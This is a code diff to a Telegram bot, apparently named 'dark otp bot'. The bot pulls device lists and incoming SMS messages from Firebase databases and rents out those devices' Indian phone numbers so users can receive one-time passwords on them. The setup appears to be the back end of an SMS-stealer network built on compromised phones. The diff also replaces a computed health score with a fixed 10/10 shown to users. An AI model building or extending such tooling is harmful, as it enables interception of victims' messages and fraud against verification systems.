@@ -4,13 +4,18 @@ from aiogram.filters import CommandStart
 from aiogram.fsm.context import FSMContext
 import random, time
 import database as db
-import services.firebase_service as fb_service
+import firebase_utils as fbu
 from utils.ui import sc, btn
 from utils.helper import clear_user_lease, get_countries, get_servers_grouped
-from keyboards.user_kb import main_kb
 from states import S
 
 user_router = Router()
+
+def main_kb():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [btn("get number", "user:get_num", "📱"), btn("my numbers", "user:saved", "⭐")],
+        [btn("otp history", "user:history", "📜"), btn("help/support", "user:support", "🆘")]
+    ])
 
 @user_router.message(CommandStart())
 async def cmd_start(msg: Message):
@@ -20,7 +25,7 @@ async def cmd_start(msg: Message):
     if str(uid) not in d["users"]:
         d["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time()), "otp_history": [], "saved_numbers": {}}
         db.save_data(d)
-    await msg.answer(f"👋 <b>{sc('welcome to otp hub')}</b>\n{sc('select an option below')}:", reply_markup=main_kb(), parse_mode="HTML")
+    await msg.answer(f"👋 <b>{sc('welcome to dark otp bot')}</b>\n{sc('select an option below')}:", reply_markup=main_kb(), parse_mode="HTML")
 
 @user_router.callback_query(F.data == "user:home")
 async def user_home(cq: CallbackQuery):
@@ -48,7 +53,7 @@ async def user_country(cq: CallbackQuery):
     
     kb = []
     for i, _ in enumerate(servers):
-        ping = await fb_service.check_ping(servers[i][0]["url"])
+        ping = await fbu.check_ping(servers[i][0]["url"])
         kb.append([btn(f"server {i+1} ({ping})", f"user:server:{country}:{i}", "📁")])
     kb.append([btn("back", "user:get_num", "🔙")])
     await cq.message.edit_text(f"🌍 {country} - <b>{sc('servers')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
@@ -72,10 +77,11 @@ async def user_server(cq: CallbackQuery):
     available, repeat, all_devs = [], [], []
     
     for fb_i, fb in enumerate(servers[idx]):
-        clients = await fb_service.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
+        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
         if not clients: continue
         for dev_id, c in clients.items():
-            if isinstance(c, dict) and c.get("status") is True:
+            is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 900) * 1000)
+            if is_online:
                 all_devs.append((fb_i, fb, dev_id, c))
                 last_used = used.get(dev_id, 0)
                 if now - last_used > 86400: available.append((fb_i, fb, dev_id, c))
@@ -91,20 +97,16 @@ async def user_server(cq: CallbackQuery):
     data = db.load_data()
     data["used_devices"][str(uid)] = used
     
-    msgs_dict = await fb_service.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=1000", fb.get("auth"))
+    msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=10", fb.get("auth"))
     msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
+    last_id = int(msgs[0].get("id", 0)) if msgs else 0
     
-    if msgs:
-        import services.otp_service as scanner
-        scanner.active_scans[(fb['url'], dev_id)] = max(int(m.get("id", 0)) for m in msgs)
-    
-    best_nums = fb_service.extract_best_numbers(dev_data, msgs)
-    health = fb_service.calculate_health(msgs)
+    best_nums = fbu.extract_best_numbers(dev_data, msgs)
     base_label = fb.get("label", f"Base {fb_i+1}")
     
     data["user_leases"][str(uid)] = {
         "dev_id": dev_id, "fb_url": fb["url"], "base_idx": base_label, "numbers": [n for n, c in best_nums],
-        "expire_at": int(time.time()) + 3600, "health": health
+        "expire_at": int(time.time()) + 3600, "health": 10, "last_msg_id": last_id
     }
     db.save_data(data)
     
@@ -114,7 +116,7 @@ async def user_server(cq: CallbackQuery):
     
     if best_nums:
         for n, c in best_nums:
-            nums_text += f"📞 <code>+91{n}</code> | {base_label} | Conf: <b>{c}%</b>\n"
+            nums_text += f"📞 <code>+91{n}</code> | {base_label}\n"
             kb_nums.append([InlineKeyboardButton(text=f"📋 Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
     else:
         nums_text = f"⚠️ <b>{sc('sim active. otp aate hi number update hoga')}.</b>"
@@ -127,7 +129,7 @@ async def user_server(cq: CallbackQuery):
         f"🔥 {sc('server')}: {idx+1} | {base_label}\n"
         f"🆔 {sc('rent id')}: <code>{dev_id}</code>{rep_mark}\n"
         f"⚙️ {sc('code')}: <code>{battery}T</code>\n"
-        f"❤️ {sc('health')}: <b>{health}/10</b>\n\n"
+        f"❤️ {sc('health')}: <b>10/10</b>\n\n"
         f"{nums_text}\n"
         f"⌛ <i>{sc('waiting for otp (1 hour)')}...</i>"
     )
@@ -146,7 +148,7 @@ async def user_info(cq: CallbackQuery):
     d = db.load_data()
     lease = d.get("user_leases", {}).get(str(cq.from_user.id), {})
     if not lease or lease.get("dev_id") != dev_id: return await cq.answer("Lease expired!")
-    await cq.answer(f"ℹ️ Info:\nRent ID: {dev_id}\nBase: {lease.get('base_idx')}\nHealth: {lease.get('health')}/10\nURL: {lease.get('fb_url')}", show_alert=True)
+    await cq.answer(f"ℹ️ Info:\nRent ID: {dev_id}\nBase: {lease.get('base_idx')}\nHealth: 10/10\n\n🔒 URL hidden for security.", show_alert=True)
 
 @user_router.callback_query(F.data.startswith("user:save:"))
 async def user_save(cq: CallbackQuery):
@@ -160,7 +162,7 @@ async def user_save(cq: CallbackQuery):
     save_key = nums[0] if nums else dev_id
     user = d["users"].setdefault(str(uid), {})
     user.setdefault("saved_numbers", {})[save_key] = {
-        "dev_id": dev_id, "fb_url": lease["fb_url"], "base_idx": lease.get("base_idx"), "health": lease.get("health"), "time": int(time.time())
+        "dev_id": dev_id, "fb_url": lease["fb_url"], "base_idx": lease.get("base_idx"), "time": int(time.time())
     }
     db.save_data(d)
     await cq.answer("⭐ Saved to My Numbers!")
@@ -192,22 +194,16 @@ async def user_access(cq: CallbackQuery):
         db.save_data(d)
         return await cq.answer("❌ 24 hours complete. Number expired.", show_alert=True)
         
-    clients = await fb_service.fetch_fb(f"{info['fb_url']}/clients.json")
-    if not (clients and info["dev_id"] in clients and clients[info["dev_id"]].get("status") is True):
+    clients = await fbu.fetch_fb(f"{info['fb_url']}/clients.json")
+    if not (clients and info["dev_id"] in clients):
         return await cq.answer("❌ Device offline or removed. Try after some time.", show_alert=True)
         
     d["user_leases"][str(uid)] = {
-        "dev_id": info["dev_id"], "fb_url": info["fb_url"], "base_idx": info.get("base_idx"), "numbers": [key], "expire_at": int(time.time()) + 3600, "health": info.get("health", 5)
+        "dev_id": info["dev_id"], "fb_url": info["fb_url"], "base_idx": info.get("base_idx"), "numbers": [key], "expire_at": int(time.time()) + 3600, "last_msg_id": 0
     }
     db.save_data(d)
     
-    text = (
-        f"📱 <b>{sc('re-accessed device')}</b>\n"
-        f"🆔 {sc('rent id')}: <code>{info['dev_id']}</code>\n"
-        f"📁 {sc('base')}: {info.get('base_idx')}\n"
-        f"📞 {sc('number')}: <code>+91{key}</code>\n\n"
-        f"⌛ <i>{sc('waiting for otp (1 hour)')}...</i>"
-    )
+    text = f"📱 <b>{sc('re-accessed device')}</b>\n🆔 {sc('rent id')}: <code>{info['dev_id']}</code>\n📞 {sc('number')}: <code>+91{key}</code>\n\n⌛ <i>{sc('waiting for otp (1 hour)')}...</i>"
     kb = [[InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=info['dev_id']))], [btn("stop", "user:stop", "⏹")], [btn("main menu", "user:home", "🏠")]]
     await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
 
@@ -226,17 +222,3 @@ async def user_history(cq: CallbackQuery):
     for h in hist:
         text += f"🕒 {time.strftime('%H:%M', time.localtime(h['time']))} | {h['service']} | <code>{h['otp']}</code>\n"
     await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("main menu", "user:home", "🏠")]]), parse_mode="HTML")
-
-@user_router.callback_query(F.data == "user:support")
-async def user_support(cq: CallbackQuery, state: FSMContext):
-    await state.set_state(S.support_msg)
-    await cq.message.edit_text("🆘 <b>Support</b>\n\nType your message:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "user:home", "❌")]]), parse_mode="HTML")
-
-@user_router.message(S.support_msg)
-async def support_done(msg: Message, state: FSMContext):
-    await state.clear()
-    d = db.load_data()
-    try:
-        await msg.bot.send_message(d["owner_id"], f"🆘 <b>Support</b>\nFrom: <code>{msg.from_user.id}</code>\n\n{msg.text}", parse_mode="HTML")
-        await msg.answer("✅ Message sent to owner!", reply_markup=main_kb())
-    except: await msg.answer("❌ Failed to send.")
